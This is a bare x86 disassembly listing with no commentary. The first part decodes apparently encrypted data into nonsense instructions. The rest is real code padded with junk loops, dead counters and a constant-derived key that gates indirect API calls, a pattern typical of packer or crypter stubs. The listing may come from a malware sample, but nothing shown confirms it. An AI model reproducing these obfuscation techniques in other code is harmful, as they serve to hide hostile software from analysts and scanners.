  4057b9:	imul   eax,edi,0xffffff94
  4057bc:	mov    DWORD PTR [eax],0xbd25fbdc
  4057c2:	sbb    BYTE PTR [edx+edx*8],ch
  4057c5:	popa   
  4057c6:	push   esi
  4057c7:	push   ss
  4057c8:	pop    esi
  4057c9:	push   ss
  4057ca:	ds rcr dl,1
  4057cd:	xchg   esp,eax
  4057ce:	addr16 int 0x7e
  4057d1:	test   BYTE PTR [ecx-0x63fdede9],dh
  4057d7:	loope  0x4057a6
  4057d9:	call   0x63d6b441
  4057de:	dec    edi
  4057df:	outs   dx,DWORD PTR ds:[esi]
  4057e0:	gs xchg ecx,eax
  4057e2:	xor    DWORD PTR [eax],0x16
  4057e5:	fnstsw WORD PTR [esp+ecx*4-0x7b]
  4057e9:	lods   al,BYTE PTR ds:[esi]
  4057ea:	cmc    
  4057eb:	xchg   ecx,eax
  4057ec:	int    0x2f
  4057ee:	and    al,0x37
  4057f0:	ss mov edx,ebx
  4057f3:	aaa    
  4057f4:	shl    BYTE PTR [eax+0x2cb7dded],0x86
  4057fb:	sar    DWORD PTR [ecx],cl
  4057fd:	or     DWORD PTR [edi+eiz*8],edi
  405800:	and    edx,DWORD PTR [eax-0x1c]
  405803:	dec    esp
  405804:	mov    cl,0xae
  405806:	fdivr  QWORD PTR [eax-0x7948795e]
  40580c:	sub    al,0xf4
  40580e:	mov    ebx,0x76f730ce
  405813:	mov    ebx,DWORD PTR ds:0xa4082ccd
  405819:	pop    ecx
  40581a:	test   eax,0xdf8fcf00
  40581f:	mov    ebp,0x1d6e248a
  405824:	or     BYTE PTR [eax-0x3395bbe6],cl
  40582a:	jns    0x4057ac
  40582c:	pop    es
  40582d:	adc    BYTE PTR [ebx+0x3d4b6661],al
  405833:	scas   eax,DWORD PTR es:[edi]
  405834:	or     BYTE PTR [ebx+0xd],0x23
  405838:	mov    cl,BYTE PTR [ebx-0x1f]
  40583b:	jns    0x4057e9
  40583d:	into   
  40583e:	cmp    al,0x5a
  405840:	aas    
  405841:	xor    edx,DWORD PTR [edx+0x6709c58d]
  405847:	(bad)  
  405848:	or     esp,esp
  40584a:	fist   DWORD PTR [ebx+0x140c416d]
  405850:	out    0xd2,eax
  405852:	pop    ds
  405853:	jno    0x405899
  405855:	cmc    
  405856:	mov    ds:0x948e9b32,eax
  40585b:	mov    ?,WORD PTR [ebx-0x2a]
  40585e:	mov    cl,0xbb
  405860:	cdq    
  405861:	sbb    esp,DWORD PTR [eax]
  405863:	push   cs
  405864:	(bad)  
  405865:	xchg   ebp,eax
  405866:	or     eax,0xbe6b4482
  40586b:	addr16 xchg esp,eax
  40586d:	out    dx,eax
  40586e:	sbb    bh,BYTE PTR [eax-0x67a79d02]
  405874:	jge    0x405863
  405876:	adc    DWORD PTR [ebp+0x4f7bfba],edx
  40587c:	retf   0xdd8e
  40587f:	cld    
  405880:	aad    0x8e
  405882:	jecxz  0x4058aa
  405884:	loop   0x40581a
  405886:	mov    cl,0x1b
  405888:	jb     0x4058e9
  40588a:	int3   
  40588b:	ss sbb eax,esp
  40588e:	lds    esp,FWORD PTR [eax-0x2a140cfc]
  405894:	xor    dl,0xaf
  405897:	rcl    edi,cl
  405899:	leave  
  40589a:	cwde   
  40589b:	pop    ebx
  40589c:	mov    al,0x84
  40589e:	(bad)  
  40589f:	daa    
  4058a0:	mov    ebp,0xb69c031e
  4058a5:	sub    BYTE PTR [ebx+eiz*4-0x46386536],dh
  4058ac:	xor    eax,0x1002c83d
  4058b1:	pop    ebx
  4058b2:	in     eax,0x7a
  4058b4:	aad    0x9b
  4058b6:	sub    DWORD PTR [edi],0xffffffaf
  4058b9:	mov    fs,esp
  4058bb:	pop    eax
  4058bc:	xor    edi,DWORD PTR [edi+0x380bcd91]
  4058c2:	add    DWORD PTR [ecx-0x7a],0x8b8b0bbb
  4058c9:	mov    ecx,0xc046f4c4
  4058ce:	or     bh,ah
  4058d0:	jmp    0x8866:0x80451465
  4058d7:	fwait
  4058d8:	mul    DWORD PTR [edx-0x67818fd6]
  4058de:	jmp    0xd39ee5f5
  4058e3:	adc    BYTE PTR [eax+0x21],bh
  4058e6:	cmp    eax,0x83dfce45
  4058eb:	cmp    edx,DWORD PTR [esi]
  4058ed:	in     eax,dx
  4058ee:	retf   0xb9a6
  4058f1:	xor    eax,0x6b2f256b
  4058f6:	sbb    esi,DWORD PTR [edi+0x5c]
  4058f9:	or     DWORD PTR [ebx+0x2c8c682e],ebp
  4058ff:	sbb    ebx,esp
  405901:	mov    ah,0xbb
  405903:	or     cl,BYTE PTR [esi+edi*2]
  405906:	ret    
  405907:	add    al,0x27
  405909:	rcl    edi,0x4c
  40590c:	dec    edi
  40590d:	or     esi,esi
  40590f:	les    edi,FWORD PTR [eax]
  405911:	xchg   ecx,eax
  405912:	(bad)  
  405913:	es int 0xca
  405916:	lea    esp,[ebp-0x3a]
  405919:	push   ecx
  40591a:	adc    esi,eax
  40591c:	(bad)  
  40591d:	push   eax
  40591e:	push   es
  40591f:	add    BYTE PTR [edx+0x73a29420],bh
  405925:	mov    al,ds:0xbf45965f
  40592a:	loope  0x4058e1
  40592c:	cmp    al,0xb5
  40592e:	jmp    0x40597a
  405930:	mov    edi,0x750211c7
  405935:	jle    0x405969
  405937:	add    al,0xba
  405939:	lds    esp,FWORD PTR [edx+0x59]
  40593c:	pop    esp
  40593d:	mov    ds:0x898fc272,eax
  405942:	pusha  
  405943:	push   eax
  405944:	and    al,0xcb
  405946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405947:	sar    DWORD PTR [esi+esi*4-0xf],0xff
  40594c:	rcl    BYTE PTR [edi],cl
  40594e:	fnstcw WORD PTR [eax+0x2abd5fff]
  405954:	(bad)  
  405955:	sub    al,0xe7
  405957:	call   FWORD PTR fs:[edx+0x6]
  40595b:	fs dec ecx
  40595d:	and    DWORD PTR [ebx],ecx
  40595f:	jbe    0x405925
  405961:	jg     0x40595d
  405963:	retf   
  405964:	sti    
  405965:	mov    ax,ds:0x3ef4366
  40596b:	mov    DWORD PTR [edi],edx
  40596d:	dec    eax
  40596e:	int    0xed
  405970:	psubb  mm7,QWORD PTR [esi]
  405973:	loopne 0x40597f
  405975:	xchg   ebx,eax
  405976:	adc    dh,ch
  405978:	push   ebp
  405979:	stos   DWORD PTR es:[edi],eax
  40597a:	jmp    0x7512db3e
  40597f:	mov    esi,0x6abbe292
  405984:	psubusw mm1,mm5
  405987:	pop    ebx
  405988:	sahf   
  405989:	inc    edx
  40598a:	mov    ebx,0x9ac47086
  40598f:	pop    es
  405990:	ret    0x54fa
  405993:	mov    ds:0x888e6065,al
  405998:	stc    
  405999:	adc    BYTE PTR [edx],0xa2
  40599c:	xchg   ebx,eax
  40599d:	nop
  40599e:	ins    DWORD PTR es:[edi],dx
  40599f:	cmp    eax,0xbc747555
  4059a4:	rol    ecx,0x59
  4059a7:	or     ch,BYTE PTR [ecx]
  4059a9:	inc    edx
  4059aa:	iret   
  4059ab:	fs push esi
  4059ad:	bound  edi,QWORD PTR [ecx-0x2a]
  4059b0:	pop    ss
  4059b1:	push   esi
  4059b2:	pop    ebp
  4059b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059b4:	jg     0x40598f
  4059b6:	jmp    0x2197:0x95564865
  4059bd:	xchg   ecx,eax
  4059be:	ins    DWORD PTR es:[edi],dx
  4059bf:	inc    eax
  4059c0:	jp     0x405989
  4059c2:	psrlw  mm6,QWORD PTR [edx]
  4059c5:	jbe    0x4059e7
  4059c7:	jl     0x40594d
  4059c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059ca:	sti    
  4059cb:	mov    eax,ds:0xd706fb19
  4059d0:	add    al,0x3d
  4059d2:	shl    BYTE PTR [edi],cl
  4059d4:	sub    bl,BYTE PTR [ecx+0x68b4d31c]
  4059da:	xchg   esp,eax
  4059db:	pop    ebx
  4059dc:	sbb    eax,0xca6d47af
  4059e1:	mov    ah,BYTE PTR [ecx+esi*2+0x5ebec87b]
  4059e8:	sti    
  4059e9:	ja     0x405990
  4059eb:	push   ebp
  4059ec:	sar    BYTE PTR [ecx],0xfe
  4059ef:	in     eax,dx
  4059f0:	call   0x52e9:0xc17af3b8
  4059f7:	or     BYTE PTR [esi+0x156e3000],dh
  4059fd:	aas    
  4059fe:	and    eax,DWORD PTR [eax]
  405a00:	out    0x25,al
  405a02:	js     0x4059b3
  405a04:	scas   al,BYTE PTR es:[edi]
  405a05:	jp     0x405991
  405a07:	sub    al,0x1c
  405a09:	dec    edx
  405a0a:	enter  0x7027,0x17
  405a0e:	mov    esp,0xc66766ee
  405a13:	leave  
  405a14:	pop    esi
  405a15:	fimul  WORD PTR [esi+ebp*4]
  405a18:	retf   
  405a19:	stc    
  405a1a:	sub    edi,DWORD PTR [edi+eax*1+0x745dfde1]
  405a21:	pop    ss
  405a22:	stc    
  405a23:	in     eax,0xa5
  405a25:	cmp    al,0x97
  405a27:	or     DWORD PTR [edx],0x63
  405a2a:	xchg   ebp,esi
  405a2c:	out    0x20,al
  405a2e:	out    0x65,eax
  405a30:	mul    BYTE PTR [edx+0x2de8f252]
  405a36:	lahf   
  405a37:	clc    
  405a38:	mov    dl,0x37
  405a3a:	push   0x5add39d2
  405a3f:	mov    bh,0x8c
  405a41:	test   al,0xf0
  405a43:	mov    ecx,0x6fdc4fea
  405a48:	mov    ds:0xed45b229,al
  405a4d:	(bad)  
  405a4e:	int3   
  405a4f:	xor    dl,BYTE PTR [edx+0x7a07dc49]
  405a55:	lods   eax,DWORD PTR ds:[esi]
  405a56:	xor    ecx,eax
  405a58:	jle    0x4059e0
  405a5a:	xchg   DWORD PTR [edx-0x66],ecx
  405a5d:	stc    
  405a5e:	ret    
  405a5f:	push   edx
  405a61:	cld    
  405a62:	xor    BYTE PTR [ebx+0x5],bh
  405a65:	ror    DWORD PTR [ecx-0x50],cl
  405a68:	jns    0x405a72
  405a6a:	mov    ?,WORD PTR [esi+0x275ac8f2]
  405a70:	mov    ecx,cs
  405a72:	stc    
  405a73:	mul    DWORD PTR [ebp+0x24]
  405a76:	xor    DWORD PTR [edi-0x18],ebx
  405a79:	dec    ecx
  405a7a:	cli    
  405a7b:	sub    al,BYTE PTR [ebp+0x217e80ce]
  405a81:	lahf   
  405a82:	rcr    BYTE PTR [eax],cl
  405a84:	jle    0x405ad0
  405a86:	pop    edx
  405a87:	jnp    0x405a9d
  405a89:	xchg   dl,dh
  405a8b:	sub    BYTE PTR ds:0x9b018dd4,bl
  405a91:	adc    BYTE PTR [ebp-0x5e],ah
  405a94:	mov    ch,0x5
  405a96:	les    edi,FWORD PTR [ebx+0x51]
  405a99:	mov    WORD PTR [edi+ebx*8+0x2b],ds
  405a9d:	icebp  
  405a9e:	xor    DWORD PTR [edi-0x18],ebx
  405aa1:	inc    ebx
  405aa2:	mov    ebx,edx
  405aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aa5:	out    0x18,eax
  405aa7:	ins    BYTE PTR es:[edi],dx
  405aa8:	sbb    esi,DWORD PTR [ecx+0x38cb0f7f]
  405aae:	jae    0x405b08
  405ab0:	or     BYTE PTR [edi-0x78321f86],0xe4
  405ab7:	or     edx,ecx
  405ab9:	xchg   DWORD PTR [ebx-0x76],edi
  405abc:	xor    ecx,esp
  405abe:	inc    edi
  405abf:	mov    ch,0xf2
  405ac1:	lea    ebp,[edx]
  405ac3:	test   eax,0xab4bd126
  405ac8:	dec    ecx
  405ac9:	stos   DWORD PTR es:[edi],eax
  405aca:	sub    eax,0x22be8e41
  405acf:	cmp    esp,edi
  405ad1:	mov    WORD PTR cs:[ecx],es
  405ad4:	mov    ebp,0x5ec67f1b
  405ad9:	xchg   ebx,eax
  405ada:	jbe    0x405a70
  405adc:	dec    esp
  405add:	mov    esi,0xdcabb941
  405ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ae3:	dec    esi
  405ae4:	shl    DWORD PTR [ebx-0x1d],1
  405ae7:	data16 mov al,al
  405aea:	in     al,dx
  405aeb:	cwde   
  405aec:	sbb    eax,0x45cb9360
  405af1:	xchg   ebp,eax
  405af2:	mov    eax,0x8c94223a
  405af7:	jbe    0x405b36
  405af9:	mov    ebp,0x21173c59
  405afe:	inc    ecx
  405aff:	pushf  
  405b00:	jbe    0x405a82
  405b02:	js     0x405ab1
  405b04:	mov    ah,0x7e
  405b06:	test   BYTE PTR [eax+0x6b],0xe5
  405b0a:	sub    cl,cl
  405b0c:	inc    esp
  405b0d:	popf   
  405b0e:	loope  0x405b62
  405b10:	add    ebx,0xffffffea
  405b13:	jmp    0x405af9
  405b15:	jp     0x405b3b
  405b17:	mov    ah,0x9d
  405b19:	call   0x67bc:0x7c678d5f
  405b20:	mov    eax,ds:0x9e70237e
  405b25:	test   al,0xd3
  405b27:	dec    esi
  405b28:	push   cs
  405b29:	inc    edx
  405b2a:	or     ecx,edx
  405b2c:	fbld   TBYTE PTR [edi+0x56]
  405b2f:	jo     0x405b4f
  405b31:	xchg   ebx,eax
  405b32:	(bad)
  405b35:	jmp    0x2cb4:0xa39059fa
  405b3c:	jae    0x405ac6
  405b3e:	push   edx
  405b3f:	ds call 0xdace:0x4f752c7c
  405b47:	mov    ah,0xdf
  405b49:	iret   
  405b4a:	in     eax,dx
  405b4b:	repz es add al,0x5a
  405b4f:	or     al,0x34
  405b51:	add    dl,BYTE PTR [ecx+0x25a65975]
  405b57:	cld    
  405b58:	fwait
  405b59:	mov    al,ds:0xa1b4d742
  405b5e:	pop    ds
  405b5f:	xor    al,0xd3
  405b61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b62:	fwait
  405b63:	arpl   WORD PTR [edi+0x1f],dx
  405b66:	mov    bh,BYTE PTR ss:[edx-0x5490cddd]
  405b6d:	mov    al,ds:0x6c954b87
  405b72:	in     eax,dx
  405b73:	xor    eax,0x94378d37
  405b78:	push   ebp
  405b79:	push   ecx
  405b7a:	loop   0x405bf8
  405b7c:	mov    bh,BYTE PTR [edi]
  405b7e:	mov    ebp,0x1b980cf9
  405b83:	or     edi,ebx
  405b85:	imul   esi,ebx,0x2e
  405b88:	and    DWORD PTR [edi+0x49],ebx
  405b8b:	pushf  
  405b8c:	cmp    DWORD PTR [ebx],ecx
  405b8e:	ret    
  405b8f:	xchg   ebx,eax
  405b90:	stc    
  405b91:	pushf  
  405b92:	mul    DWORD PTR [ecx+0x7c]
  405b95:	pop    ebx
  405b96:	push   cs
  405b97:	mov    esp,ebx
  405b99:	push   esp
  405b9a:	push   esi
  405b9b:	data16 rol BYTE PTR [ecx],cl
  405b9e:	out    0x41,al
  405ba0:	sti    
  405ba1:	hlt    
  405ba2:	adc    BYTE PTR ds:0x929db350,0x2f
  405ba9:	ins    DWORD PTR es:[edi],dx
  405baa:	call   0xb453:0xc4c70313
  405bb1:	sub    cl,dh
  405bb3:	dec    esi
  405bb4:	outs   dx,DWORD PTR ds:[esi]
  405bb5:	cdq    
  405bb6:	dec    ecx
  405bb7:	lahf   
  405bb8:	inc    edx
  405bb9:	mov    al,ds:0xe75ea609
  405bbe:	add    DWORD PTR [ebx+eiz*4-0x39473417],ebx
  405bc5:	xchg   esp,eax
  405bc6:	inc    ecx
  405bc7:	push   ecx
  405bc8:	pop    eax
  405bc9:	or     ah,BYTE PTR [ebx+eiz*1-0x55]
  405bcd:	pop    eax
  405bce:	and    dl,BYTE PTR [eax]
  405bd0:	xor    DWORD PTR [edi+0x611d913b],edi
  405bd6:	jnp    0x405c13
  405bd8:	push   esp
  405bd9:	push   ss
  405bda:	add    DWORD PTR [esi+edx*4-0x31c0af2],esp
  405be1:	cs cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  405be4:	lahf   
  405be5:	cmp    dl,BYTE PTR [esp+edi*1+0x54]
  405be9:	fwait
  405bea:	pop    edx
  405beb:	sbb    eax,0xb4415674
  405bf0:	cmp    eax,0xfc75fa0f
  405bf5:	sbb    al,0x10
  405bf7:	sti    
  405bf8:	js     0x405c03
  405bfa:	out    0x5f,al
  405bfc:	mov    ebx,0xd6830f31
  405c01:	jnp    0x405c46
  405c03:	or     al,0x96
  405c05:	pop    eax
  405c06:	jb     0x405c2f
  405c08:	sbb    BYTE PTR [ebx+0x1d],bh
  405c0b:	fcmovnbe st,st(7)
  405c0d:	bound  ebx,QWORD PTR [ecx+0x30]
  405c10:	xchg   ecx,eax
  405c11:	push   ss
  405c12:	rcl    BYTE PTR [ecx-0x2],0xf
  405c16:	push   es
  405c17:	jg     0x405c07
  405c19:	pushf  
  405c1a:	pop    esp
  405c1b:	jp     0x405bd1
  405c1d:	mov    ds:0x22754ee1,al
  405c22:	sbb    al,0x61
  405c24:	mov    dl,0x12
  405c26:	jns    0x405c88
  405c28:	(bad)  [ebx]
  405c2a:	pop    edi
  405c2b:	mov    ch,0xd3
  405c2d:	cld    
  405c2e:	adc    al,0x7e
  405c30:	bound  esp,QWORD PTR [ebx+eiz*8+0x34f262be]
  405c37:	cmp    DWORD PTR [esi],eax
  405c39:	retf   0xef2f
  405c3c:	mov    ah,0x46
  405c3e:	ret    
  405c3f:	sbb    eax,0xd5f5eab5
  405c44:	pop    eax
  405c45:	push   eax
  405c46:	fcomp  QWORD PTR [edx]
  405c48:	test   al,0x32
  405c4a:	mov    eax,ds:0x421ae2
  405c4f:	push   DWORD PTR [eax]
  405c51:	push   DWORD PTR ds:0x421d3e
  405c57:	push   DWORD PTR ds:0x421aea
  405c5d:	push   DWORD PTR ds:0x421d1e
  405c63:	push   DWORD PTR ds:0x421db2
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421ce2
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423847
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x423806
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423a72
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
